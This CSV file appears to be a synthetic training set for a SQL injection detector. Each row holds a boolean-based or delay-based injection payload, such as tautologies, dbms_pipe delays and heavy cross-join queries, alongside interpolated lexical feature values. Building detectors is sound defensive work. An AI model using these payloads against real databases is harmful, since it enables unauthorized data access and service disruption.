id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000092,attack,boolean,"a' or 1  =  1, --",nearest_attack_euclidean,R000234,0.8162432652885822,16.81690340618175,8.633806812363495,2.6647427658018237,2.816903406181744,2.0,6.6338068123634955,5.366193187636503,0.16704649884759004,0.11899335730748714,0.3935896763489236,0.3203704674959992,1.549289781454753,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.816903406181749,3.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000093,attack,boolean,"1""  )   rlike   (  select   (  case when   (  8732  =  6244  )   then 1 else 0x28 end   )    )    and   (  ""unuk""  =  ""unuk",nearest_attack_euclidean,R001630,0.058602543873740205,123.0,27.526209055452664,3.4964178346221675,42.0,13.0,54.0,14.0,0.34146341463414637,0.10569105691056913,0.43902439024390244,0.11382113821138211,0.0,4.0,0.0,0.0,0.0,2.0,0.0,8.0,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,-2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000094,attack,boolean,"-2803'  )   as jciy where 1130  =  1130 or make_set  (  4599  =  6550,6550  )  --",nearest_attack_euclidean,R002795,0.21870791212765395,79.02978558271312,30.014892791356555,4.020937929334222,18.52233918703483,24.0,25.50744639567828,11.0,0.23333566083131388,0.30429310773125073,0.32290355706061213,0.13946767437682323,1.0,-1.1102230246251565e-16,3.0,0.0,0.0,2.0,0.0,3.000000000000001,0.0,1.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000095,attack,boolean,-6843' or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'eeff'  =  'eeff,nearest_attack_euclidean,R001706,0.20919549507775564,353.1238280141268,30.123828014126776,3.3108605889073486,88.49531205650712,50.0,163.75234397174646,50.87617198587323,0.25060376987167177,0.1415935132223689,0.4637271300692187,0.14407558683674063,4.0,-1.1102230246251565e-16,1.0,0.0,0.0,1.876171985873223,0.0,34.00000000000001,0.0,0.0,0.0,12.876171985873224,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,17.0
SMOTE_000096,attack,boolean,"1%""   )    )     )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R001445,0.050938420302835824,191.08808796296648,29.0,3.472838873042711,108.0,12.0,52.24007330247208,18.848014660494414,0.5653497251157297,0.06281663612396997,0.2732183278946011,0.09861531086569919,0.0,1.0,2.0,0.0,1.0,1.0,0.0,6.848014660494415,1.0,0.0,6.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000097,attack,boolean,1   )    )    as ztcn where 1043  =  1043 and 6305  =  5785--,nearest_attack_euclidean,R001994,0.25904083556511215,59.22941631981192,22.252940525741156,3.6256441882254977,14.0,17.0,22.482356845553074,5.747059474258846,0.23703344612101795,0.2878263274326647,0.3782385476330453,0.09690167881327202,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,1.7470594742588448,0.0,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000098,attack,boolean," select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1",nearest_attack_euclidean,R000058,0.23152366168919655,59.0,21.441471574224074,3.5913938177897724,26.0,4.558528425775924,20.0,8.441471574224076,0.4406779661016949,0.07726319365721906,0.3389830508474576,0.1430757893936284,0.0,2.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,1.0,0.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000099,attack,boolean,"1 where 3902  =  3902 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000361,0.23498221828712354,141.77065277183405,33.33168910119247,4.23482393546894,71.66337820238493,16.0,39.66337820238494,14.443896367064157,0.5055785824253752,0.11309068079602523,0.27939722083332474,0.1019335159452748,0.0,-1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,4.4438963670641565,0.0,0.0,2.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000100,attack,boolean,"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",nearest_attack_euclidean,R000793,0.3310153699943895,124.90089787886399,29.380179575772797,4.062974799492917,72.0,8.380179575772797,31.760359151545593,12.760359151545593,0.5766727231149513,0.06704489994849734,0.2542299505459429,0.10205242639060849,1.0,-1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,4.0,0.0,0.0,2.380179575772796,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000101,attack,boolean,"1'+  (  select niht where 7294  =  7294 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R002743,0.6752021322234255,161.79097847426442,36.0,4.345885753918502,83.39548923713221,16.485069891018888,42.970139782037776,18.94027956407555,0.5154809144422348,0.1019480884718342,0.2658198347126074,0.11675116237332372,1.9701397820377742,-1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,2.4850698910188873,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,2.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000102,attack,boolean,"1""  )   as jask where 7629  =  7629 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R001967,0.1147311989762853,151.55836631865026,34.73525894758848,3.924330675013025,45.41155368553088,24.0,56.41155368553088,25.73525894758848,0.2993888052830861,0.15859151332814148,0.37207658222515094,0.16994309916362146,0.0,1.0,2.0,0.0,0.0,2.0,0.0,10.73525894758848,0.0,2.0,1.0,10.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000103,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,8.429369702178807e-08,63.0,22.0,3.48889649539661,26.0,4.0,24.000000000000004,9.0,0.4126984126984127,0.06349206349206349,0.38095238095238093,0.14285714285714285,0.0,2.0,2.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000104,attack,boolean,1'  )   where 5287  =  5287 and 7533  =  7533--,nearest_attack_euclidean,R002310,0.04003117542718986,47.0,18.194575106702466,3.4829168965824895,8.0,17.0,16.0,6.0,0.1702127659574468,0.3617021276595745,0.3404255319148936,0.1276595744680851,1.0,-1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000105,attack,boolean,"1%'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  '%'  =  '",nearest_attack_euclidean,R003489,0.3992917264832485,145.1402588892817,30.74389644428732,4.040226302371927,74.0,8.37194822214366,42.76831066713804,20.0,0.5099942915681304,0.057753871684433467,0.2944155417290225,0.13783629501841363,4.0,-1.1102230246251565e-16,0.0,0.0,1.0,2.0,0.0,5.256103555712681,2.0,0.0,2.3719482221436596,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000106,attack,boolean,"1'||  (  select 'eayf' where 5431  =  5431 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null   )    )   ||'",nearest_attack_euclidean,R001407,0.9319518844688245,252.9124425348699,38.4679514109929,3.9022672987803504,77.29702560295506,35.0,98.74361128794322,41.87180564397162,0.30515355547344647,0.14003502836392706,0.38987928149374057,0.1649321346688859,4.0,-1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,20.935902821985806,0.0,1.4893171369976348,3.489317136997635,11.95726854799054,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.9786342739952705,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.97863427399527
SMOTE_000107,attack,boolean,"1%""   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000886,0.1693708718772621,158.3898559026328,30.399077809330254,3.8207317207503024,68.3967723326559,8.199538904665127,58.995389046651276,22.79815561866051,0.43214959392534713,0.05178608855140818,0.3722353942862392,0.1438289232370055,0.0,4.0,0.0,0.0,1.0,2.0,0.0,8.399077809330254,2.0,0.0,2.1995389046651272,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000108,attack,boolean,"1%""   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R002157,0.19046926090995622,370.7012321358434,36.0,3.5404780427989113,94.0,45.0,165.58436011320285,66.11687202264056,0.25376332944897484,0.12148244494897734,0.44638924942177594,0.1783649761802719,0.0,4.0,0.0,0.0,0.0,3.0,0.0,33.11687202264057,2.0,3.0,0.0,23.000000000000004,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000109,attack,boolean,-4313%'  )   or 6872  =  6872 and   (  '%'  =  ',nearest_attack_euclidean,R002391,1.6919954045408696,43.309167101347114,18.061833420269423,3.4155123939554644,5.0,12.0,16.24733368107769,10.061833420269423,0.11702530948095641,0.2808607427542953,0.3693468611100805,0.23276708665466778,4.0,-1.1102230246251565e-16,1.0,0.0,0.0,2.0,0.0,1.061833420269422,2.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,0.5309167101347114,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000110,attack,boolean,1 where 3802  =  3802 and 2006  =  2006,nearest_attack_euclidean,R001069,0.34845557930875437,39.144612554364514,15.289225108729044,3.3554077957044615,8.0,17.0,12.0,2.144612554364521,0.20438660228531014,0.434321529856284,0.3065799034279652,0.054711964430440574,0.0,0.14461255436452214,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.14461255436452217,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000111,attack,boolean,"1'   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'pufu' like 'pufu",nearest_attack_euclidean,R003343,0.041016788620249156,146.73605882410052,31.0,3.4832043592853315,46.90402139058201,13.0,66.85603208587301,19.9760053476455,0.31964267605456337,0.08860700456616112,0.4556082820832632,0.13614203729601235,4.0,-1.1102230246251565e-16,0.0,0.0,1.0,1.023994652354498,0.0,11.952010695291005,0.0,1.0,1.0,2.023994652354498,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000112,attack,boolean,-7742  )   as tgzq where 7842  =  7842 or 2062  =  1563,nearest_attack_euclidean,R001685,0.18946011765562767,56.21482986389262,23.65290575317354,3.7506205554387435,13.0,20.0,19.04128274047938,4.173547123413229,0.2317323201669783,0.35651126179535125,0.3376550185267739,0.07410139951089655,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,2.0,0.0,1.1735471234132309,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000113,attack,boolean,"1 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  -- lxey",nearest_attack_euclidean,R002821,0.34144191031097637,126.67595012864678,31.472995844053898,4.225766050345867,71.31097090837729,8.472995844053898,32.945991688107796,13.945991688107796,0.5628946045588561,0.06685048754746457,0.2602892307304012,0.10996567716327815,0.0,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,4.0,0.0,0.0,2.472995844053898,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000114,attack,boolean,"1'  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'ejnt' like 'ejnt",nearest_attack_euclidean,R000601,0.06714078697467975,153.72541433363148,31.0,4.037459066138753,85.72541433363148,8.0,43.0,17.0,0.5575121261851326,0.05205739691939616,0.2798085084417544,0.11062196845371687,4.0,-1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,6.0,0.0,0.0,2.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000115,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  ""mkal"" like ""mkal",nearest_attack_euclidean,R001440,0.2242598044169469,127.65165261521345,27.078677907829245,4.021939711181407,77.0,3.0000000000000018,33.921322092170755,13.730330523042689,0.6033897692315933,0.023508692307724427,0.26556906153773174,0.10753247692295065,0.0,3.0,0.0,0.0,1.0,0.0,0.0,4.730330523042689,0.0,0.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000116,attack,boolean,"-3230""   )    )    as kbxc where 5007  =  5007 or 2107  =  8818",nearest_attack_euclidean,R003450,0.3855073179077935,60.11117194642708,22.41268972193899,3.6243671365702066,13.0,20.0,21.523861668366063,5.587310278061009,0.21699398092302952,0.3338368937277377,0.35638751655125056,0.0927816087979822,0.0,1.0,1.0,0.0,0.0,2.0,0.0,1.5873102780610093,0.0,0.0,0.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000117,attack,boolean,"1'   )    )    or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R002669,0.02447016608304526,243.98826576108644,35.98826576108642,3.6476386885245793,71.0,25.0,104.0,43.988265761086424,0.29099765787902016,0.10246396404190852,0.42625009041433937,0.1802882876647319,0.9882657610864187,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,24.0,0.0,2.0,4.0,13.0,0.988265761086419,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
SMOTE_000118,attack,boolean,-3846%' or 6872  =  6872 and '%'  =  ',nearest_attack_euclidean,R003625,1.0637282888140032,36.844469906201866,14.68893981240374,3.334443231489266,5.385176697932707,10.844469906201871,12.0,8.61482330206729,0.14692809397776965,0.29320016357988615,0.3262153091169756,0.23365643332536856,4.0,-1.1102230246251565e-16,0.6148233020672902,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,2.61482330206729,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.3851766979327098,0.6148233020672901,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000119,attack,boolean,-5031' or 9323  =  9323#,nearest_attack_euclidean,R002358,0.1946135168177593,24.0,13.179708578086906,3.3695120672575682,2.0,12.0,6.0,4.0,0.08333333333333331,0.5,0.25,0.16666666666666666,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000120,attack,boolean,1 where 4153  =  4153 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,nearest_attack_euclidean,R001481,0.20056775332709675,350.5326706417128,28.088778440285463,3.2272934273241503,83.0,55.0,164.35511376114187,48.17755688057093,0.2367880283847339,0.1569077296525345,0.4688678317107444,0.13743641025198725,0.0,0.08877844028546278,2.0,0.0,0.0,2.0,0.0,34.088778440285466,0.0,0.0,0.0,14.0,0.0,0.08877844028546275,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,17.0
SMOTE_000121,attack,boolean,? or 1  =  1 --,nearest_attack_euclidean,R000002,1.1920928955078125e-07,14.999999999999986,7.0,2.33012496531497,2.0,2.0,7.0,4.0,0.13333333333333333,0.13333333333333333,0.4666666666666667,0.26666666666666666,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
